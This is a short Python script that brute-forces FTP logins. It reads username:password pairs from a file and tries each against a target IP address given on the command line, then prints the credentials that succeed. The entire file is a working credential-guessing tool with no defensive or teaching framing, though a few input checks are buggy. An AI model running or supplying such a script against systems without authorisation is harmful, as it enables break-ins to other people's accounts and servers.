import ftplib
import optparse
import sys

parser = optparse.OptionParser()
parser.add_option('-i', dest='host', help="enter the target device's IP address")
parser.add_option('-f', dest='file_location', help="enter the password file location")
(options, arg) = parser.parse_args()

if options.host == "":
    print("You must provide an IP address")
    sys.exit()
else:
    host = options.host

if options.file_location == "":
    print("You must provide a location to potential passwords")
    sys.exit()
else:
    file_location = options.file_location

# check if file exist
try:
    file = open(file_location, 'r')
except:
    print("File not found")

def ftp_connect(host, file_location):
    
    try:
        password_file = open(file_location, 'r')
    except:
        print("File not found")
    
    # getting and splitting user:pass strings into username and password
    for line in password_file.readlines():
        username_pw_list = line.split(':')
        username = str(username_pw_list[0]).strip('\n')
        password = str(username_pw_list[1]).strip('\n')
        print(f"Now attempting username: {username}, password: {password}")
        
        try:
            ftp = ftplib.FTP(host)
            ftp.login(username, password)
            print(f"Logon succeeded, username: {username}, password: {password}")
            ftp.quit()
            
        except:
            pass
        
ftp_connect(host, file_location)

